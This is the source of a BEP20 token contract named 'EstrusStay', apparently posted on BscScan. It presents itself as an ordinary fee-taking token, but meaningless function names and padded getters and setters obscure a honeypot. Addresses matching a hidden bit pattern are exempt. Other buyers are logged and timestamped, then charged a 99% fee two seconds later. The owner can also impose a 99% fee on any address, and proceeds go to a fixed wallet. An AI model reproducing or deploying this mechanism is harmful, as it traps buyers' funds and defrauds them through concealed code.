/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract EstrusStay is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Estrus Stay ";
    string constant _symbol = "EstrusStay";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private exemptLimitIsBurnBotsWalletMode;
    mapping(address => bool) private maxTeamSwapReceiver;
    mapping(address => bool) private maxFeeLiquidityIs;
    mapping(address => bool) private tradingMaxIsTeam;
    mapping(address => uint256) private autoModeMarketingBuy;
    mapping(uint256 => address) private teamIsModeMax;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private txExemptSellMaxFeeAutoLimit = 0;
    uint256 private modeMinMarketingTeamBots = 8;

    //SELL FEES
    uint256 private feeSwapLaunchedReceiver = 0;
    uint256 private autoFeeMarketingMax = 8;

    uint256 private botsLaunchedTeamAutoSwapReceiver = modeMinMarketingTeamBots + txExemptSellMaxFeeAutoLimit;
    uint256 private feeReceiverSellAuto = 100;

    address private marketingMinSellWallet = (msg.sender); // auto-liq address
    address private maxAutoModeSellLiquidityIs = (0x20650edbf73Ba0e21EcDB53CFFFFe0834a4dB331); // marketing address
    address private buySellTradingSwapAutoMinBots = DEAD;
    address private launchedBuyTeamFeeMaxSwapBots = DEAD;
    address private burnSellMinReceiver = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private txTradingBotsMin;
    uint256 private autoBuyLiquiditySwap;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private tradingIsBurnLimit;
    uint256 private feeLimitAutoLaunchedBuy;
    uint256 private marketingTxReceiverLaunched;
    uint256 private marketingExemptLaunchedFeeLimitAuto;
    uint256 private tradingTeamLiquidityAutoMin;

    bool private modeMarketingLiquidityTxBurnSwapIs = true;
    bool private tradingMaxIsTeamMode = true;
    bool private maxReceiverLimitAuto = true;
    bool private tradingSwapModeIsFeeReceiver = true;
    bool private exemptTradingFeeMode = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private launchedMaxIsReceiverWalletFee = _totalSupply / 1000; // 0.1%

    
    bool private liquidityMinIsTx;
    bool private tradingLaunchedMinTeam;
    uint256 private autoIsReceiverFeeLimitWallet;
    uint256 private launchedMinFeeExemptMode;
    bool private launchedTxBuyLiquidity;
    uint256 private autoWalletBotsReceiverSellFeeLaunched;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        tradingIsBurnLimit = true;

        exemptLimitIsBurnBotsWalletMode[msg.sender] = true;
        exemptLimitIsBurnBotsWalletMode[address(this)] = true;

        maxTeamSwapReceiver[msg.sender] = true;
        maxTeamSwapReceiver[0x0000000000000000000000000000000000000000] = true;
        maxTeamSwapReceiver[0x000000000000000000000000000000000000dEaD] = true;
        maxTeamSwapReceiver[address(this)] = true;

        maxFeeLiquidityIs[msg.sender] = true;
        maxFeeLiquidityIs[0x0000000000000000000000000000000000000000] = true;
        maxFeeLiquidityIs[0x000000000000000000000000000000000000dEaD] = true;
        maxFeeLiquidityIs[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return liquidityBotsIsFee(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return liquidityBotsIsFee(sender, recipient, amount);
    }

    function liquidityBotsIsFee(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = buyExemptSwapFeeMinMax(sender) || buyExemptSwapFeeMinMax(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                sellMinBotsBuy();
            }
            if (!bLimitTxWalletValue) {
                buyExemptTeamBurnReceiverMin(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return modeAutoReceiverTradingWalletLimitLiquidity(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(modeMarketingLiquidityTxBurnSwapIs, "Trading is not active");
        }

        if (!Administration[sender] && !exemptLimitIsBurnBotsWalletMode[sender] && !exemptLimitIsBurnBotsWalletMode[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || maxFeeLiquidityIs[sender] || maxFeeLiquidityIs[recipient], "Max TX Limit has been triggered");

        if (modeLiquidityTradingMarketing()) {botsLiquidityBurnFee();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = autoTradingBotsIsTeamFee(sender) ? botsBuyExemptLaunchedIs(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function modeAutoReceiverTradingWalletLimitLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function autoTradingBotsIsTeamFee(address sender) internal view returns (bool) {
        return !maxTeamSwapReceiver[sender];
    }

    function txLimitAutoBots(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            botsLaunchedTeamAutoSwapReceiver = autoFeeMarketingMax + feeSwapLaunchedReceiver;
            return botsAutoMaxBurn(sender, botsLaunchedTeamAutoSwapReceiver);
        }
        if (!selling && sender == uniswapV2Pair) {
            botsLaunchedTeamAutoSwapReceiver = modeMinMarketingTeamBots + txExemptSellMaxFeeAutoLimit;
            return botsLaunchedTeamAutoSwapReceiver;
        }
        return botsAutoMaxBurn(sender, botsLaunchedTeamAutoSwapReceiver);
    }

    function botsBuyExemptLaunchedIs(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(txLimitAutoBots(sender, receiver == uniswapV2Pair)).div(feeReceiverSellAuto);

        if (tradingMaxIsTeam[sender] || tradingMaxIsTeam[receiver]) {
            feeAmount = amount.mul(99).div(feeReceiverSellAuto);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function buyExemptSwapFeeMinMax(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function botsAutoMaxBurn(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = autoModeMarketingBuy[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function buyExemptTeamBurnReceiverMin(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        teamIsModeMax[exemptLimitValue] = addr;
    }

    function sellMinBotsBuy() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (autoModeMarketingBuy[teamIsModeMax[i]] == 0) {
                    autoModeMarketingBuy[teamIsModeMax[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(maxAutoModeSellLiquidityIs).transfer(amountBNB * amountPercentage / 100);
    }

    function modeLiquidityTradingMarketing() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    exemptTradingFeeMode &&
    _balances[address(this)] >= launchedMaxIsReceiverWalletFee;
    }

    function botsLiquidityBurnFee() internal swapping {
        uint256 amountToLiquify = launchedMaxIsReceiverWalletFee.mul(txExemptSellMaxFeeAutoLimit).div(botsLaunchedTeamAutoSwapReceiver).div(2);
        uint256 amountToSwap = launchedMaxIsReceiverWalletFee.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = botsLaunchedTeamAutoSwapReceiver.sub(txExemptSellMaxFeeAutoLimit.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(txExemptSellMaxFeeAutoLimit).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(modeMinMarketingTeamBots).div(totalETHFee);

        payable(maxAutoModeSellLiquidityIs).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                marketingMinSellWallet,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getModeMarketingLiquidityTxBurnSwapIs() public view returns (bool) {
        if (modeMarketingLiquidityTxBurnSwapIs != tradingMaxIsTeamMode) {
            return tradingMaxIsTeamMode;
        }
        if (modeMarketingLiquidityTxBurnSwapIs == tradingMaxIsTeamMode) {
            return tradingMaxIsTeamMode;
        }
        if (modeMarketingLiquidityTxBurnSwapIs == tradingMaxIsTeamMode) {
            return tradingMaxIsTeamMode;
        }
        return modeMarketingLiquidityTxBurnSwapIs;
    }
    function setModeMarketingLiquidityTxBurnSwapIs(bool a0) public onlyOwner {
        if (modeMarketingLiquidityTxBurnSwapIs != exemptTradingFeeMode) {
            exemptTradingFeeMode=a0;
        }
        if (modeMarketingLiquidityTxBurnSwapIs == tradingSwapModeIsFeeReceiver) {
            tradingSwapModeIsFeeReceiver=a0;
        }
        modeMarketingLiquidityTxBurnSwapIs=a0;
    }

    function getBurnSellMinReceiver() public view returns (address) {
        if (burnSellMinReceiver != marketingMinSellWallet) {
            return marketingMinSellWallet;
        }
        if (burnSellMinReceiver == marketingMinSellWallet) {
            return marketingMinSellWallet;
        }
        return burnSellMinReceiver;
    }
    function setBurnSellMinReceiver(address a0) public onlyOwner {
        if (burnSellMinReceiver != buySellTradingSwapAutoMinBots) {
            buySellTradingSwapAutoMinBots=a0;
        }
        if (burnSellMinReceiver == burnSellMinReceiver) {
            burnSellMinReceiver=a0;
        }
        burnSellMinReceiver=a0;
    }

    function getFeeReceiverSellAuto() public view returns (uint256) {
        if (feeReceiverSellAuto == feeReceiverSellAuto) {
            return feeReceiverSellAuto;
        }
        return feeReceiverSellAuto;
    }
    function setFeeReceiverSellAuto(uint256 a0) public onlyOwner {
        if (feeReceiverSellAuto == autoFeeMarketingMax) {
            autoFeeMarketingMax=a0;
        }
        if (feeReceiverSellAuto == txExemptSellMaxFeeAutoLimit) {
            txExemptSellMaxFeeAutoLimit=a0;
        }
        feeReceiverSellAuto=a0;
    }

    function getLaunchedBuyTeamFeeMaxSwapBots() public view returns (address) {
        if (launchedBuyTeamFeeMaxSwapBots != buySellTradingSwapAutoMinBots) {
            return buySellTradingSwapAutoMinBots;
        }
        if (launchedBuyTeamFeeMaxSwapBots != maxAutoModeSellLiquidityIs) {
            return maxAutoModeSellLiquidityIs;
        }
        if (launchedBuyTeamFeeMaxSwapBots != marketingMinSellWallet) {
            return marketingMinSellWallet;
        }
        return launchedBuyTeamFeeMaxSwapBots;
    }
    function setLaunchedBuyTeamFeeMaxSwapBots(address a0) public onlyOwner {
        if (launchedBuyTeamFeeMaxSwapBots != marketingMinSellWallet) {
            marketingMinSellWallet=a0;
        }
        if (launchedBuyTeamFeeMaxSwapBots == launchedBuyTeamFeeMaxSwapBots) {
            launchedBuyTeamFeeMaxSwapBots=a0;
        }
        launchedBuyTeamFeeMaxSwapBots=a0;
    }

    function getMaxTeamSwapReceiver(address a0) public view returns (bool) {
        if (a0 == launchedBuyTeamFeeMaxSwapBots) {
            return exemptTradingFeeMode;
        }
            return maxTeamSwapReceiver[a0];
    }
    function setMaxTeamSwapReceiver(address a0,bool a1) public onlyOwner {
        if (maxTeamSwapReceiver[a0] == exemptLimitIsBurnBotsWalletMode[a0]) {
           exemptLimitIsBurnBotsWalletMode[a0]=a1;
        }
        if (a0 == maxAutoModeSellLiquidityIs) {
            modeMarketingLiquidityTxBurnSwapIs=a1;
        }
        if (a0 != maxAutoModeSellLiquidityIs) {
            maxReceiverLimitAuto=a1;
        }
        maxTeamSwapReceiver[a0]=a1;
    }

    function getTradingSwapModeIsFeeReceiver() public view returns (bool) {
        if (tradingSwapModeIsFeeReceiver != exemptTradingFeeMode) {
            return exemptTradingFeeMode;
        }
        return tradingSwapModeIsFeeReceiver;
    }
    function setTradingSwapModeIsFeeReceiver(bool a0) public onlyOwner {
        if (tradingSwapModeIsFeeReceiver != maxReceiverLimitAuto) {
            maxReceiverLimitAuto=a0;
        }
        if (tradingSwapModeIsFeeReceiver == tradingMaxIsTeamMode) {
            tradingMaxIsTeamMode=a0;
        }
        if (tradingSwapModeIsFeeReceiver == tradingSwapModeIsFeeReceiver) {
            tradingSwapModeIsFeeReceiver=a0;
        }
        tradingSwapModeIsFeeReceiver=a0;
    }

    function getTxExemptSellMaxFeeAutoLimit() public view returns (uint256) {
        if (txExemptSellMaxFeeAutoLimit == launchedMaxIsReceiverWalletFee) {
            return launchedMaxIsReceiverWalletFee;
        }
        return txExemptSellMaxFeeAutoLimit;
    }
    function setTxExemptSellMaxFeeAutoLimit(uint256 a0) public onlyOwner {
        if (txExemptSellMaxFeeAutoLimit == feeReceiverSellAuto) {
            feeReceiverSellAuto=a0;
        }
        if (txExemptSellMaxFeeAutoLimit == modeMinMarketingTeamBots) {
            modeMinMarketingTeamBots=a0;
        }
        if (txExemptSellMaxFeeAutoLimit != feeSwapLaunchedReceiver) {
            feeSwapLaunchedReceiver=a0;
        }
        txExemptSellMaxFeeAutoLimit=a0;
    }

    function getBotsLaunchedTeamAutoSwapReceiver() public view returns (uint256) {
        if (botsLaunchedTeamAutoSwapReceiver != autoFeeMarketingMax) {
            return autoFeeMarketingMax;
        }
        if (botsLaunchedTeamAutoSwapReceiver == launchedMaxIsReceiverWalletFee) {
            return launchedMaxIsReceiverWalletFee;
        }
        return botsLaunchedTeamAutoSwapReceiver;
    }
    function setBotsLaunchedTeamAutoSwapReceiver(uint256 a0) public onlyOwner {
        if (botsLaunchedTeamAutoSwapReceiver != botsLaunchedTeamAutoSwapReceiver) {
            botsLaunchedTeamAutoSwapReceiver=a0;
        }
        if (botsLaunchedTeamAutoSwapReceiver != botsLaunchedTeamAutoSwapReceiver) {
            botsLaunchedTeamAutoSwapReceiver=a0;
        }
        botsLaunchedTeamAutoSwapReceiver=a0;
    }

    function getTradingMaxIsTeam(address a0) public view returns (bool) {
        if (tradingMaxIsTeam[a0] == exemptLimitIsBurnBotsWalletMode[a0]) {
            return exemptTradingFeeMode;
        }
        if (tradingMaxIsTeam[a0] != exemptLimitIsBurnBotsWalletMode[a0]) {
            return exemptTradingFeeMode;
        }
            return tradingMaxIsTeam[a0];
    }
    function setTradingMaxIsTeam(address a0,bool a1) public onlyOwner {
        tradingMaxIsTeam[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}